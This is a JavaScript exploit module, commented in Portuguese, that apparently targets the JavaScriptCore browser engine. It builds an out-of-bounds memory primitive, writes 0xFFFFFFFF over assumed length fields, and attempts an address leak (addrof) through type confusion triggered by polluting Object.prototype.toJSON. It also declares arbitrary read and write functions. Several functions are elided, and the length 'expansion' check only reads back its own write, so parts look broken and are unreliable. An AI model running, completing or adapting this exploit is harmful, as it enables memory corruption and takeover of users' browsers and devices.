// js/core_exploit.mjs (v31.R18 - Depuração OOB Aprofundada)

import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs'; 
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false; 

const toHexHelper = (val, bits = 32) => toHex(val, bits);

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 
const HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET = 0x7C; // Para corromper m_length de AB vítima -> TC

const OOB_DV_M_VECTOR_OFFSET_IN_OOB_BUFFER = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; 
const OOB_DV_M_LENGTH_OFFSET_IN_OOB_BUFFER = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; 
const OOB_DV_M_MODE_OFFSET_IN_OOB_BUFFER = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) { 
    const FNAME_CLEAR = 'CoreExploit.clearOOBEnvironment_R18';
    const wasSetup = isOOBEnvironmentSetup;
    if (!wasSetup && !options.force_clear_even_if_not_setup) {
        // log(`[${FNAME_CLEAR}] Ambiente já limpo, não forçando.`, 'debug');
        return;
    }
    oob_array_buffer_real = null; oob_dataview_real = null; 
    isOOBEnvironmentSetup = false; // Explicitamente false
    log(`[${FNAME_CLEAR}] Ambiente limpo. Setup anterior: ${wasSetup}. Novo setup: ${isOOBEnvironmentSetup}. oob_array_buffer_real is null? ${oob_array_buffer_real === null}`, 'info');
}

export function getOOBAllocationSize() { /* ... */ }
export function getBaseOffsetInDV() { /* ... */ }
export function getInitialBufferSize() { /* ... */ }

export async function triggerOOB_primitive(options = { force_reinit: false, caller_fname: "Unknown" }) { 
    const FNAME_TRIGGER = `CoreExploit.triggerOOB_primitive(caller:${options.caller_fname})_R18`;
    let currentLength = -1; // Init com valor inválido
    if (isOOBEnvironmentSetup && oob_dataview_real && oob_array_buffer_real && oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET_IN_OOB_BUFFER + 3) {
        try { currentLength = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_IN_OOB_BUFFER, true); } catch(e){ currentLength = -2; /* detached ou outro erro */ }
    }

    if (isOOBEnvironmentSetup && !options.force_reinit) {
        if (oob_array_buffer_real && oob_dataview_real && 
            oob_array_buffer_real.byteLength === getOOBAllocationSize() && 
            oob_dataview_real.buffer === oob_array_buffer_real && 
            currentLength === 0xFFFFFFFF) {
            log(`[${FNAME_TRIGGER}] Ambiente OOB já OK e expandido. Retornando.`, 'info');
            return true;
        } else { 
            log(`[${FNAME_TRIGGER}] OOB Env inconsistente (Setup:${isOOBEnvironmentSetup}, len:${toHex(currentLength)}, alloc:${oob_array_buffer_real?.byteLength}). Forçando re-init.`, 'warn'); 
            clearOOBEnvironment({ force_clear_even_if_not_setup: true }); 
        }
    }
    log(`[${FNAME_TRIGGER}] Iniciando Config (Force: ${options.force_reinit}, Setup Anterior: ${isOOBEnvironmentSetup})`, 'test');
    const currentAllocSize = getOOBAllocationSize(); 
    clearOOBEnvironment({ force_clear_even_if_not_setup: true }); 
    
    try {
        log(`[${FNAME_TRIGGER}] Criando ArrayBuffer de ${currentAllocSize} bytes...`, 'info');
        oob_array_buffer_real = new ArrayBuffer(currentAllocSize); 
        log(`[${FNAME_TRIGGER}] oob_array_buffer_real criado. byteLength: ${oob_array_buffer_real?.byteLength}. Criando DataView...`, 'info');
        oob_dataview_real = new DataView(oob_array_buffer_real, 0, currentAllocSize);
        log(`[${FNAME_TRIGGER}] oob_dataview_real criado. Buffer length: ${oob_dataview_real?.buffer?.byteLength}.`, 'info');
        
        isOOBEnvironmentSetup = true; // Setar ANTES de usar oob_write_absolute ou operações que dependam de isOOBReady
        log(`[${FNAME_TRIGGER}] isOOBEnvironmentSetup setado para: ${isOOBEnvironmentSetup}.`, 'info');

        if (currentAllocSize > OOB_DV_M_LENGTH_OFFSET_IN_OOB_BUFFER + 3) {
            log(`[${FNAME_TRIGGER}] Expandindo m_length do oob_dv em ${toHexHelper(OOB_DV_M_LENGTH_OFFSET_IN_OOB_BUFFER)}...`, 'info');
            oob_dataview_real.setUint32(OOB_DV_M_LENGTH_OFFSET_IN_OOB_BUFFER, 0xFFFFFFFF, true);
            const newLenCheck = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_IN_OOB_BUFFER, true);
            log(`    m_length do oob_dv expandido para ${toHex(newLenCheck)}.`, 'info', FNAME_TRIGGER);
            if (newLenCheck !== 0xFFFFFFFF) {
                throw new Error(`Falha ao verificar a expansão do m_length. Lido: ${toHex(newLenCheck)}`);
            }
        } else { 
            const eMsg = `Falha ao expandir m_length: AllocSize (${currentAllocSize}) pequeno para offset ${toHexHelper(OOB_DV_M_LENGTH_OFFSET_IN_OOB_BUFFER)}.`; 
            isOOBEnvironmentSetup = false; throw new Error(eMsg); 
        }
        const finalLen = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_IN_OOB_BUFFER, true);
        log(`[${FNAME_TRIGGER}] Ambiente OOB CONFIGURADO. oob_dv.len=${toHex(finalLen)}. isOOBEnvSetup: ${isOOBEnvironmentSetup}`, 'good');
        return true;
    } catch (e) { 
        log(`ERRO CRÍTICO ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER); 
        console.error(e); 
        clearOOBEnvironment({ force_clear_even_if_not_setup: true }); 
        throw e; 
    }
}

export function oob_read_absolute(offset_in_oob_buffer, byteLength) { /* ... */ }
export function oob_write_absolute(offset_in_oob_buffer, value, byteLength) { /* ... */ }

export function isOOBReady(caller_fname = "Unknown") { 
    const FNAME_ISREADY = `CoreExploit.isOOBReady(caller:${caller_fname})_R18`;
    let mLE = false; 
    let setupFlag = isOOBEnvironmentSetup;
    let abExists = !!oob_array_buffer_real;
    let dvExists = !!oob_dataview_real;
    let abOk = abExists && (oob_array_buffer_real instanceof ArrayBuffer) && oob_array_buffer_real.byteLength > 0;
    let dvOk = dvExists && (oob_dataview_real instanceof DataView);
    let dvBufferOk = abOk && dvOk && oob_dataview_real.buffer === oob_array_buffer_real && oob_dataview_real.buffer.byteLength > 0;

    log(`[${FNAME_ISREADY}] Checando: setupFlag=${setupFlag}, abExists=${abExists}, dvExists=${dvExists}, abOk=${abOk}, dvOk=${dvOk}, dvBufferOk=${dvBufferOk}`, 'debug');

    if (setupFlag && abOk && dvOk && dvBufferOk) { 
        try { 
            if (oob_array_buffer_real.byteLength > OOB_DV_M_LENGTH_OFFSET_IN_OOB_BUFFER + 3) {
                const current_m_length = oob_dataview_real.getUint32(OOB_DV_M_LENGTH_OFFSET_IN_OOB_BUFFER, true);
                mLE = (current_m_length === 0xFFFFFFFF); 
                log(`[${FNAME_ISREADY}] m_length lido de ${toHex(OOB_DV_M_LENGTH_OFFSET_IN_OOB_BUFFER)}: ${toHex(current_m_length)}. mLE: ${mLE}`, 'debug');
            } else {
                log(`[${FNAME_ISREADY}] oob_array_buffer_real.byteLength (${oob_array_buffer_real.byteLength}) muito pequeno para ler m_length.`, 'warn');
            }
        } catch (e) { log(`[${FNAME_ISREADY}] Erro ao ler m_length: ${e.message}`, 'error'); mLE = false; } 
    }
    const overallReady = setupFlag && abOk && dvOk && dvBufferOk && mLE;
    log(`[${FNAME_ISREADY}] Status Final: Overall=${overallReady}`, overallReady ? 'info' : 'error');
    return overallReady;
}

async function _perform_explicit_dv_reset_after_arb_op(fname_parent_for_log) { /* ... */ }
export async function arb_read(absolute_address, byteLength) { /* ... */ }
export async function arb_write(absolute_address, value, byteLength) { /* ... */ }
export async function selfTestOOBReadWrite(logFnParam) { /* ... */ }

const HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC = HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET; 
const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
const HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE = 8;    

export async function selfTestTypeConfusionAndMemoryControl(logFnParam) { /* ... */ }

let _targetObjectForCoreAddrof_R18 = null; 
let _core_heisenbug_tc_on_first_expected_object_confirmed_R18 = false;
let _core_victim_float_view_for_addrof_R18 = null; 
let _core_m1_victim_being_stringified_R18 = null; 

function _toJSONProbeForCoreAddrof_R18() { 
    const FNAME_PROBE = "CoreExploit._toJSONProbeForCoreAddrof_R18";
    let currentThisType = Object.prototype.toString.call(this);
    let isOurExpectedM2Target = (_core_m1_victim_being_stringified_R18 && this === _core_m1_victim_being_stringified_R18.payload_m2_r18);

    log(`[${FNAME_PROBE}] 'this' type: ${currentThisType}. Is ref to M2? ${isOurExpectedM2Target}. TC Confirmed Flag: ${_core_heisenbug_tc_on_first_expected_object_confirmed_R18}`, "leak");

    if (isOurExpectedM2Target && currentThisType === '[object Object]' && !_core_heisenbug_tc_on_first_expected_object_confirmed_R18) { 
        log(`[${FNAME_PROBE}] TC CONFIRMADA para payload_m2! Escrevendo targetObject...`, "vuln");
        _core_heisenbug_tc_on_first_expected_object_confirmed_R18 = true; 
        if (_targetObjectForCoreAddrof_R18 && _core_victim_float_view_for_addrof_R18) {
            try {
                _core_victim_float_view_for_addrof_R18[0] = _targetObjectForCoreAddrof_R18;
                log(`[${FNAME_PROBE}] targetObject escrito em float_view[0].`, "info");
            } catch (e_write) { 
                log(`[${FNAME_PROBE}] ERRO ao escrever targetObject: ${e_write.message}`, "error");
                _core_heisenbug_tc_on_first_expected_object_confirmed_R18 = false; 
            }
        } else { _core_heisenbug_tc_on_first_expected_object_confirmed_R18 = false; }
    } else if (isOurExpectedM2Target && currentThisType !== '[object Object]' && !_core_heisenbug_tc_on_first_expected_object_confirmed_R18) {
        log(`[${FNAME_PROBE}] 'this' é payload_m2, mas tipo é ${currentThisType}.`, "warn");
    }
    return { core_addrof_probe_r18_executed: true };
}

export async function attemptAddrofUsingCoreHeisenbug(targetObject) { // MODIFICADO PARA R18
    const FNAME_FUNC = "CoreExploit.attemptAddrofUsingCoreHeisenbug_R18";
    log(`[${FNAME_FUNC}] Iniciando tentativa de addrof R18...`, "info");

    _targetObjectForCoreAddrof_R18 = targetObject; 
    _core_heisenbug_tc_on_first_expected_object_confirmed_R18 = false; 
    _core_victim_float_view_for_addrof_R18 = null;
    _core_m1_victim_being_stringified_R18 = null;

    let addrof_result = { success: false, message: "Addrof (Heisenbug R18) não iniciado.", leaked_address_as_int64: null, leaked_address_as_double: null };
    let originalToJSON_R18 = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let pollutedByCore_R18 = false;

    try {
        log(`[${FNAME_FUNC}] Chamando triggerOOB_primitive (force_reinit: true)...`, "info");
        await triggerOOB_primitive({ force_reinit: true, caller_fname: FNAME_FUNC }); 
        log(`[${FNAME_FUNC}] triggerOOB_primitive completado. Chamando isOOBReady...`, "info");
        if (!isOOBReady(FNAME_FUNC)) { 
            log(`[${FNAME_FUNC}] isOOBReady() retornou false IMEDIATAMENTE APÓS triggerOOB_primitive. Verifique logs de isOOBReady.`, "error");
            throw new Error("Ambiente OOB não pôde ser inicializado corretamente para Addrof R18."); 
        }
        log(`[${FNAME_FUNC}] Ambiente OOB pronto. Escrevendo valor crítico para TC...`, "info");

        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        log(`[${FNAME_FUNC}] Escrita crítica em ${toHexHelper(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC)} realizada.`, "warn");
        await PAUSE(150); 

        let core_victim_buffer_local = new ArrayBuffer(HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE); 
        _core_victim_float_view_for_addrof_R18 = new Float64Array(core_victim_buffer_local); 
        _core_victim_float_view_for_addrof_R18.fill(0.3344556677); 
        
        let core_m2_victim_local_obj = { m2_marker_R18: "core_m2_for_addrof_R18" };
        
        _core_m1_victim_being_stringified_R18 = { 
            m1_marker_R18: "core_m1_container_R18", 
            payload_m2_r18: core_m2_victim_local_obj // Nome da prop consistente com a sonda
        };
        log(`[${FNAME_FUNC}] Estrutura M1/M2 R18 criada.`, "info");
        
        Object.defineProperty(Object.prototype, 'toJSON', { value: _toJSONProbeForCoreAddrof_R18, writable: true, configurable: true, enumerable: false });
        pollutedByCore_R18 = true;
        
        JSON.stringify(_core_m1_victim_being_stringified_R18); 
        log(`[${FNAME_FUNC}] JSON.stringify concluído. Flag TC Confirmada: ${_core_heisenbug_tc_on_first_expected_object_confirmed_R18}`, "info");
        
        if (_core_heisenbug_tc_on_first_expected_object_confirmed_R18) {
            const val_double = _core_victim_float_view_for_addrof_R18[0]; 
            addrof_result.leaked_address_as_double = val_double;
            const temp_buf = new ArrayBuffer(8); new Float64Array(temp_buf)[0] = val_double;
            const temp_u32_view = new Uint32Array(temp_buf);
            const leaked_addr64 = new AdvancedInt64(temp_u32_view[0], temp_u32_view[1]);
            addrof_result.leaked_address_as_int64 = leaked_addr64;
            log(`[${FNAME_FUNC}] Heisenbug TC INTERNA OK e escrita! Lido: Dbl=${val_double}, I64=${leaked_addr64.toString(true)}`, "vuln");

            if (val_double !== 0.3344556677 && (leaked_addr64.low() !== 0 || leaked_addr64.high() !==0) ) {
                const lhi = leaked_addr64.high(); const nan_inf = (lhi >= 0x7FF00000 && lhi < 0x80000000) || (lhi >= 0xFFF00000 && lhi < 0x100000000);
                if (!nan_inf) { addrof_result.success = true; addrof_result.message = `Addrof R18 TC OK. Addr Pot: ${leaked_addr64.toString(true)}`; }
                else { addrof_result.message = `Addrof R18 TC OK, mas val ${leaked_addr64.toString(true)} é NaN/Inf.`;}
            } else { addrof_result.message = `Addrof R18 TC OK, mas val (${leaked_addr64.toString(true)}) é preenchimento/0.`;}
        } else { addrof_result.message = "Heisenbug TC INTERNA NÃO confirmada pela sonda R18."; }
    } catch (e) { addrof_result.message = `Erro crítico em Addrof R18: ${e.message || String(e)}`; log(`[${FNAME_FUNC}] EXCEPTION: ${addrof_result.message}`, "critical");} 
    finally {
        if (pollutedByCore_R18) { if (originalToJSON_R18) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON_R18); else delete Object.prototype.toJSON; }
        _targetObjectForCoreAddrof_R18 = null; _core_victim_float_view_for_addrof_R18 = null; _core_m1_victim_being_stringified_R18 = null;
    }
    log(`[${FNAME_FUNC}] Retornando resultado Addrof R18: ${JSON.stringify(addrof_result)}`, addrof_result.success ? "good" : "warn");
    return addrof_result;
}

// getStableConfusedArrayBuffer, get_powerful_dataview_on_oob_buffer, read_memory_with_dataview, write_memory_with_dataview
// permanecem como na v31.R13 - sem alterações aqui.
export async function getStableConfusedArrayBuffer() { /* ... */ }
export async function get_powerful_dataview_on_oob_buffer() { /* ... */ }
export function read_memory_with_dataview(dv, dv_base_address, target_address, num_bytes, littleEndian = true) { /* ... */ }
export function write_memory_with_dataview(dv, dv_base_address, target_address, value, num_bytes, littleEndian = true) { /* ... */ }
